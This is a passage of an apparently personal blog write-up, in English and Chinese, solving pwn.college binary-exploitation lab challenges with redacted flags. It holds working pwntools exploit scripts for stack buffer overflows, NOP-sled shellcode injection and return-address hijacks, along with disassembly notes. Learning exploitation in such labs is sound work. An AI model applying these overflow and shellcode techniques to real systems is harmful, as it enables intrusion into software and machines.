class="line">0x000013ad      488d3d540c..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;/challenge/binary-exploitation-null-write&quot;</span></span><br><span class="line"><span class="comment"># 0xa0 + 8 - 1 = 167 bytes after null</span></span><br><span class="line">padding = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">167</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    payload = padding + p16(<span class="number">0x13ad</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">0.114514</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************W}</p>
-<h1 id="basic-shellcode">Basic Shellcode</h1>
-<p>Shellcode copied onto stack and executed. Stack location randomized,
-so shellcode must be position-independent.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/binary-exploitation-basic-shellcode&quot;</span>)</span><br><span class="line">p.send(asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
-<h1 id="nop-sleds">NOP Sleds</h1>
-<p><strong>NOP (No Operation)</strong> opcode
-<code>\x90</code>：什么都不做，仅把 RIP 向前移动一个字节。</p>
-<p><strong>NOP Sled</strong> 在 Shellcode 前铺上大量
-<code>\x90</code>。跳到这片区域的任意位置，CPU 就会顺着一路”滑”到
-Shellcode。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-nopsled-shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nop_sled = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">2048</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload = (nop_sled + shellcode).ljust(<span class="number">4096</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
-<h1 id="null-free-shellcode">NULL-Free Shellcode</h1>
-<p>Same as prev, pwntools <code>shellcraft.cat</code> is already
-null-free.</p>
-<p>pwn.college{*******************************************}</p>
-<h1 id="hijack-to-mapped-shellcode-easy">Hijack to (Mapped) Shellcode
-(easy)</h1>
-<p>Two-stage: first send shellcode to mmap’d region, then overflow
-return address to jump there. Buffer 112 bytes, canary disabled.</p>
-<p>Shellcode mapped at <code>0x2edca000</code>. Padding to return
-address = 137 bytes.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-hijack-to-mmap-shellcode-w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1: send shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">p.send(shellcode.ljust(<span class="number">4096</span>, <span class="string">b&#x27;\x90&#x27;</span>))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2: overflow return address</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">137</span></span><br><span class="line">p.send(padding + p64(<span class="number">0x2edca000</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
-<h1 id="hijack-to-mapped-shellcode-hard">Hijack to (Mapped) Shellcode
-(hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/binary-exploitation-hijack-to-mmap-shellcode</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; mmap shellcode at fixed address 0x178d0000</span><br><span class="line">0x0000153c      bf00008d17     mov edi, 0x178d0000</span><br><span class="line">0x00001541      e8bafbffff     call sym.imp.mmap</span><br><span class="line">; ...</span><br><span class="line">; getchar() waits for newline between shellcode read and overflow read</span><br><span class="line">0x000015f9      e842fbffff     call sym.imp.getchar</span><br><span class="line">; ...</span><br><span class="line">; buf -&gt; rbp - 0x30, padding = 0x30 + 8 = 56 bytes</span><br><span class="line">0x00001622      488d45d0       lea rax, [buf]</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-hijack-to-mmap-shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1: send shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">p.send(shellcode.ljust(<span class="number">4096</span>, <span class="string">b&#x27;\x90&#x27;</span>))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2: press enter for getchar()</span></span><br><span class="line">p.sendline()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3: overflow return address</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">48</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">p.send(padding + p64(<span class="number">0x178d0000</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
-<h1 id="hijack-to-shellcode-easy">Hijack to Shellcode (easy)</h1>
-<p>Buffer 102 bytes, return address 136 bytes after buffer. ASLR
-disabled, stack executable, canary disabled, no PIE.</p>
-<p>Stack addresses are fixed: buffer at <code>0x7fffffffd1a0</code>,
-return address at <code>0x7fffffffd228</code>.</p>
-<h2 id="nop-sled-的必要性">NOP Sled 的必要性</h2>
-<p>通过 <code>pwntools</code> 的 <code>process()</code> 跑程序和直接在
-bash 里跑，传递的环境变量不同：</p>
-<ul>
-<li><code>pwntools</code> 可能带不同的 <code>_</code> 变量、Python
-继承的环境变量、<code>argv[0]</code> 路径长度不同</li>
-<li>环境变量占据空间变化导致栈指针偏移十几字节</li>
-</ul>
-<p>用 <code>\x90</code> NOP sled 铺在 shellcode
-前面可以容忍这种偏移。</p>
-<h2 id="stack-overlap-self-destruct">Stack Overlap / Self-Destruct</h2>
-<p><code>ret</code> 后 <code>RSP</code> 上移 8 字节。如果 shellcode
-紧贴返回地址，shellcode 中的 <code>push</code>
-指令会往回覆盖自己的机器码（栈向下生长，<code>push</code> 减 RSP
-写入数据）。</p>
-<p>解决：用 padding 隔开 shellcode 和返回地址，让 shellcode
-放在返回地址之前。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/binary-exploitation-hijack-to-shellcode-w&quot;</span>)</span><br><span class="line"></span><br><span class="line">target_address = <span class="number">0x7FFFFFFFD1B0</span></span><br><span class="line">offset = <span class="number">136</span></span><br><span class="line">nop_sled = <span class="string">b&quot;\x90&quot;</span> * <span class="number">32</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">padding_len = offset - <span class="built_in">len</span>(shellcode) - <span class="built_in">len</span>(nop_sled)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [NOP sled] + [Shellcode] + [Padding] + [RetAddr -&gt; NOP sled]</span></span><br><span class="line">payload = nop_sled + shellcode + (<span class="string">b&quot;A&quot;</span> * padding_len) + p64(target_address)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
-<h1 id="hijack-to-shellcode-hard">Hijack to Shellcode (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/binary-exploitation-hijack-to-shellcode</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; buf -&gt; rbp - 0x40, padding = 0x40 + 8 = 72 bytes</span><br><span class="line">0x00401d22      488d45c0       lea rax, [buf]</span><br><span class="line">0x00401d26      4889c6         mov rsi, rax        ; read into buf</span><br></pre></td></tr></table></figure>
-<p>Use GDB (with ASLR disabled) to find exact buffer address:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwngdb /challenge/binary-exploitation-hijack-to-shellcode</span><br><span class="line"><span class="built_in">unset</span> <span class="built_in">env</span></span><br><span class="line"><span class="built_in">break</span> *0x00401d2e</span><br><span class="line">run</span><br><span class="line"><span class="comment"># rsi (buf) = 0x00007fffffffdc70</span></span><br></pre></td></tr></table></figure>
-<p>buffer -&gt; <code>0x00007fffffffdc70</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/binary-exploitation-hijack-to-shellcode&quot;</span>, env=&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># target somewhere in the NOP sled after return address</span></span><br><span class="line">target_address = <span class="number">0x00007fffffffdd70</span></span><br><span class="line">offset = <span class="number">72</span>  <span class="comment"># 0x40 + 8</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">nop_sled = <span class="string">b&quot;\x90&quot;</span> * <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Padding] + [RetAddr] + [NOP sled] + [Shellcode]</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p64(target_address) + nop_sled + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn.college&#123;*******************************************&#125;</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
